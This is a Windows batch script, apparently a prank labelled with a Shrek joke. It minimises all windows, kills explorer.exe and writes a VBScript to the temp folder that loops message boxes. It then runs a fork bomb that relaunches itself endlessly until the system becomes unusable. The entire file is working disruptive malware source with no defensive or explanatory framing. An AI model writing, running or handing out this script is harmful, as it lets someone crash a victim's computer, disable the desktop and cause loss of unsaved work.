@echo off

if "%1"=="" (
    start "" /min "%~f0" min setup
    exit
)
if "%1" NEQ "min" exit

if "%2"=="setup" goto setup
if "%2"=="fork" goto fork

:setup

start "" /min powershell -command "(new-object -com shell.application).minimizeall()"

taskkill /F /im explorer.exe >nul

if exist "%temp%\shrek_popup.vbs" (
	del /F /Q "%temp%\shrek_popup.vbs"
)

set "file=%temp%\shrek_popup.vbs"

> "%file%" echo Set objShell = WScript.CreateObject("WScript.Shell")
>>"%file%" echo MsgBox "You have been shreked :("
>>"%file%" echo objShell.Run "start """" /min """ ^& WScript.Arguments(0) ^& """ min fork"
>>"%file%" echo Do
>>"%file%" echo MsgBox "Oh no!"
>>"%file%" echo Loop

start "" /max "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg"

timeout /t 1 /nobreak >nul
start "" "%temp%\shrek_popup.vbs" "%~f0"

exit

:fork

timeout /t 1 /nobreak >nul

start "" /min "%~f0" min fork

goto fork

exit
